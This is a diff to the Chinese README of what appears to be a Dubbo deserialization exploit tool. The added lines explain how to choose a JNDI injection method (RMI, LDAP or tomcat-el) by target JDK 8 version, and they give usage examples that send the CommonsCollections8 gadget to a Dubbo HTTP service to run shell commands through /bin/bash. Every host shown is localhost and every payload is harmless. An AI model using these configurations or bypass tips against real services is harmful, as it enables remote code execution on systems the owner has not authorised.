@@ -25,11 +25,15 @@ check.dat预置参数文件内容：
 ### 快速漏洞攻击参数配置（将会根据相应匹配的参数选择对应的所有gadget攻击）
 ### 多个参数英文逗号分割
 
-#JNDI注入url
+#JNDI注入url，JNDI注入需要考虑对方jdk版本，若是jdk8，
+# 当小于jdk8u121，可以使用rmi服务进行JNDI注入攻击，
+# jdk8u121～jdk8u191之间可以选择ldap服务替代，
+# jdk8u191+需要使用tomcat-el依赖打法，或者使用gadget
 JNDI=ldap://127.0.0.1:43658/Calc
 
 #执行的shell命令
 CMD=/System/Applications/Calculator.app/Contents/MacOS/Calculator
+#或者 CMD=/bin/bash,-c,/System/Applications/Calculator.app/Contents/MacOS/Calculator
 
 #Reference远程class代码url
 CODEBASE=http://127.0.0.1:80,Calc
@@ -69,7 +73,36 @@ CommonsCollections8
 --args
 /System/Applications/Calculator.app/Contents/MacOS/Calculator
 ```
-
+例（多参数的使用）：
+```
+--target
+127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService
+--protocol
+http
+--serialization
+java
+--gadget
+CommonsCollections8
+--args
+'touch /tmp/dubbo.test'
+```
+或
+```
+--target
+127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService
+--protocol
+http
+--serialization
+java
+--gadget
+CommonsCollections8
+--args
+'/bin/bash'
+--args
+'-c'
+--args
+'touch /tmp/dubbo.test'
+```
 ## gadget列表
 
 ---------------------------------------------------------------------------------------------------------
